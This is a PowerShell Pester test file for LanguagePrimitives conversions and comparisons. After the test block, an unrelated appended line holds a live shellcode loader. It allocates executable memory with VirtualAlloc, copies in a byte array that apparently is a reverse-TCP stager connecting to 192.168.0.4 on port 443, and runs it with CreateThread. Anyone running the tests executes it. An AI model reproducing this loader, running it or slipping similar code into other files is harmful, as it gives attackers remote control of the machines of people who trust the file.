

Describe "Language Primitive Tests" -Tags "CI" {
    It "Equality comparison with string and non-numeric type should not be culture sensitive" {
        $date = [datetime]'2005,3,10'
        $val = [System.Management.Automation.LanguagePrimitives]::Equals($date, "3/10/2005")
        $val | Should -BeTrue
    }

    It "Test conversion of an PSObject with Null Base Object to bool" {
        $mshObj = New-Object psobject
        { [System.Management.Automation.LanguagePrimitives]::ConvertTo($mshObj, [bool]) } | Should -BeTrue
    }

    It "Test conversion of an PSObject with Null Base Object to string" {
        $mshObj = New-Object psobject
        { [System.Management.Automation.LanguagePrimitives]::ConvertTo($mshObj, [string]) -eq "" } | Should -BeTrue
    }

    It "Test conversion of an PSObject with Null Base Object to object" {
        $mshObj = New-Object psobject
        { $mshObj -eq [System.Management.Automation.LanguagePrimitives]::ConvertTo($mshObj, [Object]) } | Should -BeTrue
    }

    It "Test Conversion of an IEnumerable to object[]" {
        $col = [System.Diagnostics.Process]::GetCurrentProcess().Modules
        $ObjArray = [System.Management.Automation.LanguagePrimitives]::ConvertTo($col, [object[]])
        $ObjArray.Length | Should -Be $col.Count
    }

    It "Casting recursive array to bool should not cause crash" {
        $a[0] = $a = [PSObject](, 1)
        [System.Management.Automation.LanguagePrimitives]::IsTrue($a) | Should -BeTrue
    }

    It "LanguagePrimitives.GetEnumerable should treat 'DataTable' as Enumerable" {
        $dt = [System.Data.DataTable]::new("test")
        $dt.Columns.Add("Name", [string]) > $null
        $dt.Columns.Add("Age", [string]) > $null
        $dr = $dt.NewRow(); $dr["Name"] = "John"; $dr["Age"] = "20"
        $dr2 = $dt.NewRow(); $dr["Name"] = "Susan"; $dr["Age"] = "25"
        $dt.Rows.Add($dr); $dt.Rows.Add($dr2)

        [System.Management.Automation.LanguagePrimitives]::IsObjectEnumerable($dt) | Should -BeTrue
        $count = 0
        [System.Management.Automation.LanguagePrimitives]::GetEnumerable($dt) | ForEach-Object { $count++ }
        $count | Should -Be 2
    }

    It "TryCompare should succeed on int and string" {
        $result = $null
        [System.Management.Automation.LanguagePrimitives]::TryCompare(1, "1", [ref] $result) | Should -BeTrue
        $result | Should -Be 0
    }

    It "TryCompare should fail on int and datetime" {
        $result = $null
        [System.Management.Automation.LanguagePrimitives]::TryCompare(1, [datetime]::Now, [ref] $result) | Should -BeFalse
    }

    It "TryCompare should succeed on int and int and compare correctly smaller" {
        $result = $null
        [System.Management.Automation.LanguagePrimitives]::TryCompare(1, 2, [ref] $result) | Should -BeTrue
        $result | Should -BeExactly -1
    }

    It "TryCompare should succeed on string and string and compare correctly greater" {
        $result = $null
        [System.Management.Automation.LanguagePrimitives]::TryCompare("bbb", "aaa", [ref] $result) | Should -BeTrue
        $result | Should -BeExactly 1
    }

    It "TryCompare should succeed on string and string and compare case insensitive correctly" {
        $result = $null
        [System.Management.Automation.LanguagePrimitives]::TryCompare("AAA", "aaa", $true, [ref] $result) | Should -BeTrue
        $result | Should -BeExactly 0
    }

    It "TryCompare with cultureInfo is culture sensitive" {
        $result = $null
        $swedish = [cultureinfo] 'sv-SE'
        
        $val = [System.Management.Automation.LanguagePrimitives]::TryCompare("ooo", "ååå", $false, $swedish, [ref] $result)
        $val | Should -BeTrue
        $result | Should -BeExactly -1
    }

    It "TryCompare compares greater than null as Compare" {
        $result = $null

        $compareResult = [System.Management.Automation.LanguagePrimitives]::Compare($null, 10)
        $val = [System.Management.Automation.LanguagePrimitives]::TryCompare($null, 10, [ref] $result)
        $val | Should -BeTrue
        $result | Should -BeExactly $compareResult
    }

    It "TryCompare compares less than null as Compare" {
        $result = $null

        $compareResult = [System.Management.Automation.LanguagePrimitives]::Compare(10, $null)
        $val = [System.Management.Automation.LanguagePrimitives]::TryCompare(10, $null, [ref] $result)
        $val | Should -BeTrue
        $result | Should -BeExactly $compareResult
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

